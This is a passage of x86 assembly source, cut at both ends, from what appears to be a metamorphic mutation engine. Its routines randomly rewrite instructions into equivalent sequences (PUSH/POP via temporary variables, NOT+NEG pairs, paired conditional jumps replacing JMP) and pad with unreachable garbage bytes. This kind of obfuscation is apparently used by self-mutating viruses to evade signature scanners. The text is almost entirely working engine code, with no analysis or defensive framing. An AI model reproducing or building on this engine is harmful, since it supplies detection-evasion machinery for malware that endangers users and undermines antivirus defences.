                jz    @@Multiple_MOV
   @@Multiple_OP:
                call    RandomBoolean
                or      eax, eax
                jz    @@Single
                call    Xp_SaveOperation         ; Generate a PUSH [Mem]
                call    Xp_GenPUSHMem
                call    Xp_GetTempVar            ; Allocate a temp. variable
                call    Xp_GenPOPMem             ; Generate a POP [TempVar]
                call    Xp_GenOPRegMem           ; Generate a OP Reg,[TempVar]
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Multiple_MOV:
                call    RandomBoolean       ; Randomly decide if we make the
                or      eax, eax            ; normal operation
                jz    @@Multiple_OP
                call    Xp_GenPUSHMem       ; Generate PUSH [Mem]
                call    Xp_GenPOPReg        ; Generate POP Reg
                jmp     Xp_DecreaseRecurseLevel

   @@Single:    mov     eax, [ebp+Xp_Operation]
                add     eax, [ebp+Xp_8Bits]
                add     eax, 2              ; Set OP Reg,[Mem]
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenOPRegMem  endp


;; Function to generate an OP [Mem],Reg
Xp_GenOPMemReg  proc
   @@Start:     call    Xp_IncreaseRecurseLevel
                cmp     eax, 3       ; Single if recurs. level is too high to
                jae   @@Single       ; recurse
                call    Random
                and     eax, 7
                or      eax, eax
                jnz   @@Single       ; Select single with a prob. of 7/8
                call    Random
   @@Multiple:  mov     eax, [ebp+Xp_8Bits]
                or      eax, eax
                jnz   @@Single           ; Select single if the size of the
                                         ; operands is 8 bits
                mov     eax, [ebp+Xp_Operation]
                cmp     eax, 40h               ; MOV?
                jz    @@Multiple_MOV
   @@Multiple_OP:
                call    Xp_SaveOperation        ; Make the sequence:
                call    Xp_GenPUSHMem           ; PUSH [Mem]
                call    Xp_GetTempVar           ; POP [TempVar]
                call    Xp_GenPOPMem            ; OP [TempVar],Reg
                mov     eax, [ebp+Xp_Operation] ; PUSH [TempVar]
                cmp     eax, 38h                ; POP [Mem]
                jz    @@Multiple_OP_CMP         ; or if operation is CMP/TEST:
                cmp     eax, 48h                ; PUSH [Mem]
                jz    @@Multiple_OP_TEST        ; POP [TempVar]
   @@Multiple_OP_Common:                        ; CMP/TEST [TempVar],Reg
                call    Xp_GenOPMemReg          ; That CMP/TEST can be also
                call    Xp_GenPUSHMem           ; SUB/AND, since we can modify
                call    Xp_RestoreOperation     ; [TempVar] as we want.
                call    Xp_GenPOPMem
                jmp     Xp_DecreaseRecurseLevel
   @@Multiple_OP_CMP:
                mov     ecx, 3Bh
                mov     edx, 2Bh
                jmp   @@Multiple_OP_CMPTEST_Common
   @@Multiple_OP_TEST:
                mov     ecx, 23h
                mov     edx, 4Bh
   @@Multiple_OP_CMPTEST_Common:
                call    RandomBoolean
                or      eax, eax
                jz    @@Multiple_OP_CMPTEST_Next
                mov     edx, ecx
   @@Multiple_OP_CMPTEST_Next:
                add     edx, [ebp+Xp_8Bits]
                mov     [edi], edx
                call    Xp_CopyMemoryReference
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Multiple_MOV:
   @@Multiple_MOV_Other:
                call    Random         ; Should we make this specific-for-MOV
                and     eax, 3         ; operation or do we make the normal
                or      eax, eax       ; one?
                jz    @@Multiple_OP    ; Make the normal, then
                cmp     eax, 1
                jz    @@Multiple_MOV_1  ; Select one of the two possibilities
                cmp     eax, 2
                jnz   @@Multiple_MOV_Other
   @@Multiple_MOV_2:
                call    Xp_GenPUSHReg    ; Make PUSH Reg / POP [Mem]
                call    Xp_GenPOPMem
                jmp     Xp_DecreaseRecurseLevel
   @@Multiple_MOV_1:
                call    Xp_SaveOperation       ; Make MOV [TempVar],Reg /
                call    Xp_GetTempVar          ; / PUSH [TempVar] / POP [Mem]
                jmp   @@Multiple_OP_Common

   @@Single:    mov     eax, [ebp+Xp_Operation]
                add     eax, [ebp+Xp_8Bits]     ; Make the pseudoopcode:
                add     eax, 3                  ; OP + 3 = OP Mem,Reg
                mov     [edi], eax
                call    Xp_CopyMemoryReference  ; Copy the operands
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenOPMemReg  endp


;; Generate an OP [Mem],Imm. Also check special cases.
;; When we work with a direct value (Imm), we have lots of new possiblities,
;; like the composed operations (ADD + SUB, MOV + OP, etc.).
Xp_GenOPMemImm  proc
   @@Start:     call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    RandomBoolean
                or      eax, eax           ; Single or multiple?
                jz    @@Single             ; Decide it randomly
                call    Random
                and     eax, 7
                or      eax, eax   ; Probability of 1/8 of making a triplet
                jnz   @@Double
   @@Triple:    mov     eax, [ebp+Xp_8Bits]
                or      eax, eax        ; Is size of operands 8 bits?
                jnz   @@Double          ; Then, make a pair rather than this
                call    Xp_GenPUSHMem    ; Make PUSH [Mem]
                call    Xp_SaveOperation
                call    Xp_GetTempVar    ; Make POP [TempVar]
                call    Xp_GenPOPMem
                mov     eax, [ebp+Xp_Operation]
                cmp     eax, 38h                ; CMP?
                jz    @@Triple_CMP
                cmp     eax, 48h                ; TEST?
                jz    @@Triple_TEST
                call    Xp_GenOPMemImm       ; Generate OP [TempVar],Imm
                call    Xp_GenPUSHMem        ; Generate PUSH [TempVar]
                call    Xp_RestoreOperation
                call    Xp_GenPOPMem         ; Generate POP [Mem]
                jmp     Xp_DecreaseRecurseLevel
   @@Triple_CMP:
                mov     ecx, 2Ch             ; ECX = SUB Mem,Imm
                mov     edx, 3Ch             ; EDX = CMP Mem,Imm
                jmp   @@Triple_CMPTEST_Common
   @@Triple_TEST:
                mov     ecx, 24h             ; ECX = AND Mem,Imm
                mov     edx, 4Ch             ; EDX = TEST Mem,Imm
   @@Triple_CMPTEST_Common:
                call    RandomBoolean
                or      eax, eax             ; Select randomly ECX or EDX
                jz    @@Triple_CMPTEST_Next
                mov     edx, ecx
   @@Triple_CMPTEST_Next:
                add     edx, [ebp+Xp_8Bits]  ; Set the size of the operands
                mov     [edi], edx
                call    Xp_CopyMemoryReference  ; Make the instruction
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Double:    mov     eax, [ebp+Xp_Operation]
                cmp     eax, 40h                 ; MOV?
                jz    @@Double_MOV
                or      eax, eax                 ; ADD?
                jz    @@Double_ADD
                cmp     eax, 38h                 ; CMP?
                jz    @@Single
                cmp     eax, 48h                 ; TEST?
                jz    @@Single
   @@Double_OP: mov     eax, [ebp+Xp_FlagRegOrMem]
                push    eax
                mov     eax, 1                     ; Mark that we are making
                mov     [ebp+Xp_FlagRegOrMem], eax ; a memory operation
                call    Xp_MakeComposedOPImm       ; Generate a composed op.
                pop     ebx
                mov     [ebp+Xp_FlagRegOrMem], ebx ; Restore the flag
                or      eax, eax                   ; If we couldn't make it,
                jnz   @@Single                     ; jump and make a single.
                jmp     Xp_DecreaseRecurseLevel
   @@Double_MOV:
                call    RandomBoolean           ; Decide randomly if we do
                or      eax, eax                ; this or a generic operation
                jz    @@Double_OP
                mov     eax, [ebp+Xp_8Bits]     ; If size is 8 bits, we can't
                or      eax, eax                ; make this option
                jnz   @@Double_OP
                call    Xp_GenPUSHImm           ; Generate a PUSH Imm
                call    Xp_GenPOPMem            ; Generate a POP [Mem]
                jmp     Xp_DecreaseRecurseLevel
   @@Double_ADD:
                call    RandomBoolean
                or      eax, eax
                jz    @@Double_OP
                mov     eax, [ebp+Xp_Immediate]
                cmp     eax, 1                  ; ADD Mem,1?
                jz    @@Double_ADD_NOTNEG       ; Then try NOT+NEG
                cmp     eax, -1                 ; ADD Mem,-1?
                jnz   @@Double_OP               ; Then try NEG+NOT
   @@Double_ADD_NEGNOT:
                call    Xp_GenNEGMem            ; Generate NEG Mem
                call    Xp_GenNOTMem            ; Generate NOT Mem
                jmp     Xp_DecreaseRecurseLevel ; Effectively decreases Mem
   @@Double_ADD_NOTNEG:
                call    Xp_GenNOTMem            ; Generate NOT Mem
                call    Xp_GenNEGMem            ; Generate NEG Mem
                jmp     Xp_DecreaseRecurseLevel ; Effectively increases Mem


   @@Single:    mov     eax, [ebp+Xp_Operation] ; Get the operation
                cmp     eax, 30h                ; XOR?
                jz    @@Single_XOR
                or      eax, eax                ; ADD?
                jz    @@Single_ADD
   @@Single_OP: mov     eax, [ebp+Xp_Operation] ; Set OP Mem,Imm
                add     eax, [ebp+Xp_8Bits]
                add     eax, 4
                mov     [edi], eax
                call    Xp_CopyMemoryReference  ; Copy the operands
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
   @@Single_XOR:                                ; Check if we are making
                mov     eax, [ebp+Xp_Immediate] ; XOR Mem,-1
                cmp     eax, -1
                jnz   @@Single_OP               ; If we are, we can code it
                call    RandomBoolean           ; also as NOT Mem
                or      eax, eax
                jz    @@Single_OP
                call    Xp_GenNOTMem
                jmp     Xp_DecreaseRecurseLevel
   @@Single_ADD:
                call    RandomBoolean           ; If we do ADD Mem,1/-1, we
                or      eax, eax                ; can use INC Mem or DEC Mem
                jz    @@Single_OP
                mov     eax, [ebp+Xp_Immediate]
                cmp     eax, 1
                jz    @@Single_INC
                cmp     eax, -1
                jnz   @@Single_OP
     @@Single_DEC:
                mov     ebx, 8                ; Set DEC if Imm == -1
     @@Single_INCDEC_Common:
                mov     eax, [ebp+Xp_8Bits]   ; Set the size of the operation
                add     eax, 4Fh              ; Set the opcode (local, this
                mov     [edi], eax            ; opcode only exists between the
                push    ebx                   ; expander and the assembler).
                call    Xp_CopyMemoryReference ; Copy the rest of the operands
                pop     ebx
                mov     [edi+7], ebx          ; Set the operation: INC or DEC
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
     @@Single_INC:
                xor     ebx, ebx              ; Set INC if Imm == 1
                jmp   @@Single_INCDEC_Common
Xp_GenOPMemImm  endp

;; Generate a PUSH Reg
Xp_GenPUSHReg   proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single           ; 1/4 to generate a complex PUSH
   @@Multiple:  call    Xp_SaveOperation
                call    Xp_GetTempVar    ; Allocate a temporary variable
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax ; Make a MOV [TempVar],Reg
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPMemReg
                call    Xp_GenPUSHMem           ; Make a PUSH [TempVar]
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, 50h                ; Construct the PUSH Reg
Xp_GenPUSHReg_Common:
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenPUSHReg   endp

;; Generate a PUSH [Mem]
Xp_GenPUSHMem   proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 7        ; Chance of 1/8 of generating a complex
                or      eax, eax      ; PUSH
                jnz   @@Single
                call    Xp_SaveOperation
                call    Xp_GenPUSHMem    ; Make a PUSH [Mem]
                call    Xp_GetTempVar    ; Make a POP [TempVar]
                call    Xp_GenPOPMem
                call    Xp_GenPUSHMem    ; Make a PUSH [TempVar]
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, 51h         ; Construct the PUSH Mem directly
Xp_GenPUSHMem_Common:
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenPUSHMem   endp

;; Generate a POP Reg
Xp_GenPOPReg    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single     ; Chance of 1/4 to make it complex
    @@Multiple: call    Xp_SaveOperation
                call    Xp_GetTempVar     ; Get a temporary variable
                call    Xp_GenPOPMem      ; Make a POP [TempVar]
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPRegMem    ; Make a MOV Reg,[TempVar]
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

    @@Single:   mov     eax, 58h            ; Make the POP Reg directly
                jmp     Xp_GenPUSHReg_Common
Xp_GenPOPReg    endp

;; POP Mem is direct this time. If not, too many PUSH/POP Mem are generated
Xp_GenPOPMem    proc
                call    Xp_IncreaseRecurseLevel
    @@Single:   mov     eax, 59h
                jmp     Xp_GenPUSHMem_Common
Xp_GenPOPMem    endp

;; Generate a PUSH Imm
Xp_GenPUSHImm   proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    RandomBoolean
                or      eax, eax      ; Chance of 1/2 of making it complex
                jz    @@Single
   @@Multiple:  call    Xp_SaveOperation
                call    Xp_GetTempVar           ; Get a temporary variable
                mov     eax, 40h                ; Make a MOV [TempVar],Imm
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPMemImm
                call    Xp_GenPUSHMem           ; Make a PUSH [TempVar]
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, 68h
                mov     [edi], eax            ; Make the instruction directly
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenPUSHImm   endp


;; LEA:
;; As an instruction, LEA is only used for compressing instructions that will
;; be expanded here. If we find a LEA in the final x86 codification, it's a
;; LEA that is converted by the shrinker in MOV, ADD or any like that.
;; Using LEA in this way allow us to have a mini-embedded instruction swapper
;; 100% compatible in all cases.

Xp_GenLEA       proc
                call    Xp_SaveOperation         ; Save the operation
                mov     eax, [ebp+Xp_Mem_Index1]
                cmp     eax, [ebp+Xp_Register]   ; Index1 == destiny register?
                jz    @@Addition1                ; Then, addition
                mov     eax, [ebp+Xp_Mem_Index2]
                cmp     eax, [ebp+Xp_Register]   ; Index2 == destiny register?
                jz    @@Addition2                ; Then, addition
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax  ; Set MOV as first instruct.
       @@MOV_Other:
                call    Random
                and     eax, 3
                or      eax, eax
                jz    @@MOV_Other
                cmp     eax, 1
                jz    @@MOV_FirstIndex1   ; Make MOV/ADD with first index
                cmp     eax, 2
                jz    @@MOV_FirstIndex2   ; Make MOV/ADD with second index
       @@MOV_FirstAddition:               ; Make MOV/ADD with DWORD addition
                mov     eax, [ebp+Xp_Mem_Addition]
                or      eax, eax
                jz    @@MOV_Finished2     ; It's 0? Then look if we finished
                mov     [ebp+Xp_Immediate], eax
                call    Xp_GenOPRegImm     ; Generate a MOV/ADD Reg,Imm
                xor     eax, eax           ; Set ADD operation from now
                mov     [ebp+Xp_Mem_Addition], eax
                jmp   @@MOV_Finished
       @@MOV_FirstIndex1:
                mov     eax, [ebp+Xp_Mem_Index1] ; Get the first index
                cmp     eax, 8                   ; If 8 (no_reg), jump to look
                jz    @@MOV_Finished2            ; if we finished
                mov     [ebp+Xp_SrcRegister], eax ; Set the register and gen.
                call    Xp_GenOPRegReg            ; a MOV/ADD Reg,Reg1
                mov     eax, 8
                mov     [ebp+Xp_Mem_Index1], eax  ; Anulate the register
                jmp   @@MOV_Finished
       @@MOV_FirstIndex2:
                mov     eax, [ebp+Xp_Mem_Index2]  ; Get the 2nd register and
                cmp     eax, 8                    ; look if we have finished
                jz    @@MOV_Finished2
                cmp     eax, 8                 ; If it hasn't a multiplicator
                jb    @@MOV_FirstIndex2_Set    ; then make the MOV/ADD
                sub     eax, 40h               ; Subtract the multiplicator
       @@MOV_FirstIndex2_Set:
                mov     [ebp+Xp_SrcRegister], eax ; Set the source register
                call    Xp_GenOPRegReg           ; Generate a MOV/ADD Reg,Reg2
                mov     eax, [ebp+Xp_Mem_Index2]
                cmp     eax, 7                   ; Do it have a multiplicator?
                jbe   @@MOV_FirstIndex2_Set8     ; If not, eliminate the reg.
                sub     eax, 40h                 ; Eliminate the multiplicator
                mov     [ebp+Xp_Mem_Index2], eax ; Set the clear register
                jmp   @@MOV_Finished
       @@MOV_FirstIndex2_Set8:
                mov     eax, 8                   ; Set no_reg
                mov     [ebp+Xp_Mem_Index2], eax
       @@MOV_Finished:
                xor     eax, eax                 ; Set ADD as operation from
                mov     [ebp+Xp_Operation], eax  ; now
       @@MOV_Finished2:
                mov     eax, [ebp+Xp_Mem_Index1] ; Get the index1
                cmp     eax, 8                   ; If it's not no_reg, then
                jnz   @@MOV_Other                ; it's not finished
                mov     eax, [ebp+Xp_Mem_Index2] ; Get the index2
                cmp     eax, 8                   ; no_reg?
                jnz   @@MOV_Other                ; If not, continue
                mov     eax, [ebp+Xp_Mem_Addition]
                or      eax, eax                 ; Check if addition is 0
                jnz   @@MOV_Other                ; If not, continue
                call    Xp_RestoreOperation ; We finish when both indexes are
                ret                         ; 8 and the addition is 0
   @@Addition1: mov     eax, 8
                mov     [ebp+Xp_Mem_Index1], eax ; Set 8 as Index1 and put ADD
                jmp   @@MOV_Finished             ; to make it directly
   @@Addition2: mov     eax, 8
                mov     [ebp+Xp_Mem_Index2], eax ; Set 8 as Index2 and start
                jmp   @@MOV_Finished            ; with ADD instead as with MOV
Xp_GenLEA       endp

;; Generate a NOT Reg
Xp_GenNOTReg    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax              ; Generate a complex NOT with
                jnz   @@Single                ; a prob. of 1/4
                call    Xp_GenNEGReg          ; Generate a NEG
                call    Xp_SaveOperation
                mov     eax, -1               ; And now generate an ADD Reg,-1
Xp_GenNOTReg_Common:
                mov     [ebp+Xp_Immediate], eax
                xor     eax, eax
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegImm
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

    @@Single:   mov     eax, [ebp+Xp_8Bits]   ; Generate directly the NOT
                or      eax, eax
                jz    @@NOT32
                mov     eax, 0E2h
                jmp   @@NOT_
      @@NOT32:  mov     eax, 0E0h
      @@NOT_:
Xp_GenNOTReg_Common_Direct:
                mov     [edi], eax         ; Construct the NOT/NEG instruction
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenNOTReg    endp

;; Generate a NEG Reg instruction or group of instructions that do the same
Xp_GenNEGReg    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single

                call    Xp_GenNOTReg        ; Make a NOT Reg + ADD Reg,1
                call    Xp_SaveOperation
                mov     eax, 1
                jmp     Xp_GenNOTReg_Common

   @@Single:    mov     eax, [ebp+Xp_8Bits]
                or      eax, eax
                jz    @@NEG32
                mov     eax, 0E6h
                jmp     Xp_GenNOTReg_Common_Direct
      @@NEG32:  mov     eax, 0E4h
                jmp     Xp_GenNOTReg_Common_Direct
Xp_GenNEGReg    endp


;; Generate a NOT Mem
Xp_GenNOTMem    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single
                                         ; Complex:
                call    Xp_GenNEGMem     ; Generate a NEG Mem + ADD Mem,-1
                call    Xp_SaveOperation
                mov     eax, -1
Xp_GenNOTMem_Common:
                mov     [ebp+Xp_Immediate], eax
                xor     eax, eax
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPMemImm
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, [ebp+Xp_8Bits]
                or      eax, eax
                jz    @@NOT32
                mov     eax, 0E3h
                jmp   @@NOT_
      @@NOT32:  mov     eax, 0E1h
      @@NOT_:
Xp_GenNOTMem_Common_Direct:
                mov     [edi], eax      ; Construct the NOT/NEG Mem instrc.
                call    Xp_CopyMemoryReference
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenNOTMem    endp

;; Generate a NEG Mem
Xp_GenNEGMem    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single
                                         ; Complex:
                call    Xp_GenNOTMem     ; Make NOT Mem + ADD Mem,1
                call    Xp_SaveOperation
                mov     eax, 1
                jmp     Xp_GenNOTMem_Common

   @@Single:    mov     eax, [ebp+Xp_8Bits]
                or      eax, eax
                jz    @@NEG32
                mov     eax, 0E7h
                jmp     Xp_GenNOTMem_Common_Direct
      @@NEG32:  mov     eax, 0E5h
                jmp     Xp_GenNOTMem_Common_Direct
Xp_GenNEGMem    endp

;; Generate a RET operation
Xp_GenRET       proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single        ; Put it directly with a prob. of 1/4
                call    Xp_SaveOperation
                call    Xp_GetTempVar        ; Allocate a temporary variable
                call    Xp_GenPOPMem         ; Make a POP [TempVar]
                call    Xp_GenJMPMem         ; Make a JMP [TempVar]
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
     @@Single:  mov     eax, 0FEh            ; Code the RET directly and
                mov     [edi], eax           ; generate some not-reachable
                add     edi, 10h             ; garbage.
                jmp     Xp_DecreaseRecurseLevel
Xp_GenRET       endp

;; Generate a CALL Reg
Xp_GenCALLReg   proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3             ; Make it complex with a prob. of
                or      eax, eax           ; 1/4
                jnz   @@Single
                call    Xp_SaveOperation
                call    Xp_GetTempVar      ; Let's make MOV [TempVar],Reg +
                mov     eax, 40h           ; + CALL [TempVar]
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPMemReg
                call    Xp_GenCALLMem
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Single:    mov     eax, 0ECh          ; Code the CALL directly
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenCALLReg   endp

;; Generate a CALL Mem (used for API calls, so EAX, ECX and EDX regs. are free
;; for use).
Xp_GenCALLMem   proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    RandomBoolean
                or      eax, eax
                jnz   @@Single      ; Make it complex with a prob. of 1/2
   @@Multiple:  call    RandomBoolean
                or      eax, eax
                jz    @@Multiple_Reg   ; Here we can use EAX,ECX or EDX
                call    Xp_SaveOperation
                call    Xp_GenPUSHMem   ; Make PUSH [Mem]
                call    Xp_GetTempVar
                call    Xp_GenPOPMem    ; Make POP [TempVar]
                call    Xp_GenCALLMem   ; Make CALL [TempVar]
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Multiple_Reg:
                call    Xp_SaveOperation
   @@Multiple_Reg_Again:
                call    Random
                and     eax, 3
                cmp     eax, 3
                jz    @@Multiple_Reg_Again   ; Get EAX, ECX or EDX
                mov     [ebp+Xp_Register], eax
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPRegMem       ; Make MOV EAX/ECX/EDX,[Mem]
                call    Xp_GenCALLReg        ; Make CALL EAX/ECX/EDX
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, 0EAh        ; Code the CALL [Mem] directly
Xp_GenCALLMem_Common:
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenCALLMem   endp

;; Generate a JMP Reg
Xp_GenJMPReg    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    RandomBoolean
                or      eax, eax
                jz    @@Single
                call    Random
                and     eax, 3        ; Make it complex with a prob. of 1/4
                or      eax, eax
                jz    @@Double_1
   @@Double_0:  call    Xp_SaveOperation
                call    Xp_GetTempVar         ; Allocate a temporary variable
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPMemReg        ; Make a MOV [TempVar],Reg
                call    Xp_GenJMPMem          ; Make a JMP [TempVar]
                call    Xp_RestoreOperation   ; Generate some not-reachable
                jmp     Xp_EndJmp             ; garbage
   @@Double_1:  call    Xp_GenPUSHReg         ; Make PUSH Reg + RET
                call    Xp_GenRET
                jmp     Xp_EndJmp

   @@Single:    mov     eax, 0EDh             ; Make the JMP Reg directly
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                add     edi, 10h
                jmp     Xp_EndJmp             ; Make some garbage
Xp_GenJMPReg    endp

;; Generate a JMP [Mem]
Xp_GenJMPMem    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single
                call    Xp_SaveOperation
                call    Xp_GenPUSHMem      ; Make PUSH Mem
                call    Xp_GetTempVar
                call    Xp_GenPOPMem       ; Make POP Mem
                call    Xp_GenJMPMem       ; Make JMP Mem
                call    Xp_RestoreOperation
                jmp     Xp_EndJmp          ; Generate some garbage

   @@Single:    mov     eax, 0EBh        ; Code the JMP Mem directly
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                add     edi, 10h
                jmp     Xp_EndJmp
Xp_GenJMPMem    endp

;; This function generates a JMP @xxx or a group of instructions that make
;; the same, like CMP Reg,Reg/JZ @xxx. 
Xp_GenJMP       proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single  ; Increase the recurse level and make the JMP
                                ; directly if we are too deep in recursivity
                mov     eax, [ebp+AddressOfLastInstruction]
                sub     eax, 10h
                cmp     eax, esi   ; Check if we are making the last instrc.
                jz    @@Single     ; If so, code it directly
                call    Random
                and     eax, 7     ; Make a complex JMP with a prob. of 1/8
                or      eax, eax
                jnz   @@Single
   @@Double_Other:
                call    Random     ; Now select the type of complext JMP we
                and     eax, 3     ; are going to make.
                or      eax, eax
                jz    @@Double_Other
                cmp     eax, 1         ; Make Jcc(even) + Jcc(odd) or vicev.
                jz    @@Double_JccJcc
                cmp     eax, 2         ; Make CMP + Jcc
                jz    @@Double_CMPJcc
                                       ; Let's do Jcc + Jcc (2nd version)
                mov     edx, 73h
                mov     ecx, 76h
   @@Double_JccJcc2:
                call    Random
                or      eax, eax            ; Make a random selection of two
                jz    @@Double_JccJcc2_Next ; types of conditional jumps from
                mov     edx, 75h            ; the set JAE, JBE, JNZ: any
   @@Double_JccJcc2_Next:                   ; combination of two of these
                call    RandomBoolean       ; types one after another will
                or      eax, eax            ; perform an unconditional JMP.
                jz    @@Double_JccJcc2_Next02
                mov     eax, edx            ; Exchange them randomly
                mov     edx, ecx
                mov     ecx, eax
   @@Double_JccJcc2_Next02:
                call    Xp_SaveOperation
                push    ecx                 ; Set the first Jcc (EDX)
                mov     [ebp+Xp_Operation], edx

                call    Xp_GenJcc_SingleJcc ; Make a direct Jcc
                pop     ecx                 ; Set the second Jcc (ECX)
                mov     [ebp+Xp_Operation], ecx
                call    Xp_GenJcc_SingleJcc ; Make the direct Jcc
                call    Xp_RestoreOperation
                jmp   @@InsertStopMark      ; Since there aren't branch-end
                                  ; instructions (although when executed they
                                  ; will never pass beyond), we must insert
                                  ; a branch-end instruction to force the
                                  ; disassembler to stop the branch of code.
   @@Double_CMPJcc:
                call    Xp_SaveOperation  ; Let's make a CMP Reg,Reg/Jcc
                mov     eax, 38h
                mov     [ebp+Xp_Operation], eax
   @@Double_CMPJcc_x:
                call    Random            ; Get a register to compare
                and     eax, 7
                cmp     eax, 4            ; Don't play with ESP!
                jz    @@Double_CMPJcc_x
                mov     [ebp+Xp_Register], eax     ; Set source and destiny
                mov     [ebp+Xp_SrcRegister], eax  ; register as the same
                xor     eax, eax                   ; Set a size of 32 bits
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPRegReg    ; Construct the comparision instrc.
                call    Xp_GetSpecialJcc  ; Get a Jcc that is prepared for
   @@Double_CMPJcc_Common:                ; this type of operation
                xor     eax, 1            ; Invert the last bit, since the
                mov     [ebp+Xp_Operation], eax  ; returned Jcc is prepared
                                                 ; to make a NOP operation.
                call    Xp_GenJcc_SingleJcc   ; Make the Jcc as a single ins.
                call    Xp_RestoreOperation
                jmp   @@InsertStopMark    ; Set a stop mark.
   @@Double_JccJcc:
                call    Xp_SaveOperation ; Other type of a pair of Jccs that
                call    Random           ; always jump: any conditional jump
                and     eax, 0Fh         ; with even opcode has its opposite
                add     eax, 70h         ; in the same opcode but setting last
                mov     [ebp+Xp_Operation], eax ; bit to 1. So, we select a
                push    eax                 ; random conditional jump, we
                call    Xp_GenJcc_SingleJcc ; insert it, and after that we
                pop     eax                 ; insert the same Jcc but with the
                jmp   @@Double_CMPJcc_Common ; bit 0 inversed. Example:
                                             ; JZ @xxx + JNZ @xxx
                                             ; JB @xxx + JAE @xxx
   @@Single:    mov     eax, 0E9h        ; The jump directly.
                mov     [edi], eax
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+1], eax
                add     edi, 10h
Xp_EndJmp:
                call    Random         ; Now make garbage bytes with a prob.
                and     eax, 3         ; of 1/4
                or      eax, eax
